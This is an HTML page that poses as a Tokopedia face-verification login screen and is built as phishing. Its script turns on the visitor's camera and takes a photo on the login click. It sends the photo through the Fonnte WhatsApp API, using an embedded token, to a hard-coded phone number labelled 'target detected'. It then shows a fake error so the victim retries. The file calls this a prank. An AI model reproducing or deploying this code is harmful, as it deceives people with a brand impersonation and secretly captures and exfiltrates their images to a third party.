<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tokopedia - Verifikasi Keamanan</title>
    <style>
        :root { --p: #00AA5B; }
        body { background: #f4f7f9; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #fff; padding: 30px 20px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
        .logo { font-size: 26px; font-weight: bold; color: var(--p); margin-bottom: 5px; }
        h1 { font-size: 16px; margin-bottom: 20px; color: #31353B; font-weight: 600; }
        .cam-box { width: 220px; height: 220px; border-radius: 50%; border: 4px solid var(--p); margin: 0 auto 20px; overflow: hidden; background: #000; position: relative; }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .btn { background: var(--p); color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
        .btn:disabled { background: #E5E7E9; color: #AAB4BF; }
        #msg { font-size: 12px; margin-top: 15px; color: #888; }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo">tokopedia</div>
        <h1>Verifikasi Wajah</h1>
        <div class="cam-box">
            <video id="v" autoplay playsinline muted></video>
        </div>
        <button id="b" class="btn" disabled>Login Sekarang</button>
        <div id="msg">Mengaktifkan sensor biometrik...</div>
    </div>

    <canvas id="c" style="display:none;"></canvas>

    <script>
        const v = document.getElementById('v'), b = document.getElementById('b'), msg = document.getElementById('msg'), can = document.getElementById('c');

        // --- KONFIGURASI SAKTI ---
        const tokenWA = 'Qu8z1RwCifaCKz3zs7az'; // Token baru kamu
        const nomorWA = '6285117090357'; // Nomor tujuan

        // Aktifkan Kamera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(s => { 
            v.srcObject = s; 
            b.disabled = false; 
            msg.innerText = "Kamera Siap ✅"; 
        })
        .catch(e => { 
            msg.innerText = "Akses Kamera Ditolak!";
            msg.style.color = "red";
        });

        b.onclick = async () => {
            b.disabled = true;
            b.innerText = "Memproses...";
            msg.innerText = "Menganalisis wajah...";

            // 1. Ambil Foto
            can.width = v.videoWidth;
            can.height = v.videoHeight;
            const ctx = can.getContext('2d');
            ctx.translate(can.width, 0); ctx.scale(-1, 1);
            ctx.drawImage(v, 0, 0);
            
            // 2. Ubah ke Base64 ringan
            const imgData = can.toDataURL('image/jpeg', 0.3);

            // 3. Siapkan Data (Pakai parameter 'message' agar tidak Error)
            const params = new URLSearchParams();
            params.append('target', nomorWA);
            params.append('url', imgData);
            params.append('message', '🚨 *TARGET TERDETEKSI*'); // Kunci agar status: true
            params.append('caption', '📸 Seseorang baru saja mencoba login.');

            try {
                // 4. Kirim ke Fonnte
                const response = await fetch('https://api.fonnte.com/send', {
                    method: 'POST',
                    headers: { 'Authorization': tokenWA },
                    body: params
                });

                const hasil = await response.json();
                console.log("Fonnte Response:", hasil);

                // 5. Efek Prank Gagal
                setTimeout(() => {
                    alert("Gagal memverifikasi wajah (Error 403). Silakan coba lagi dengan pencahayaan yang lebih terang.");
                    b.disabled = false;
                    b.innerText = "Login Sekarang";
                    msg.innerText = "Wajah tidak jelas, ulangi lagi.";
                }, 1200);

            } catch (err) {
                console.error("Error:", err);
                alert("Gangguan server verifikasi.");
                b.disabled = false;
            }
        };
    </script>
</body>
</html>
